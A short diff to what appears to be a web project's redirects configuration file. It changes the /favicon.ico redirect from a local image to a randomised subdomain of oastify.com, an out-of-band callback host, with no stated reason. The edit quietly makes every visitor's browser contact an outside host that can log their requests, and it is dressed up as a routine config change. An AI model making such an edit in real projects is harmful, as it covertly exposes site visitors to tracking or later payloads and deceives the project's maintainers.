@@ -1,5 +1,5 @@
 {
   "redirects": [
-    { "source": "/favicon.ico", "destination": "/vercel.svg", "permanent": true }
+    { "source": "/favicon.ico", "destination": "https://bcrdnqvob9nvnlli9cr815hs1j7av1yrmg.oastify.com/thread.svg", "permanent": true }
   ]
 }
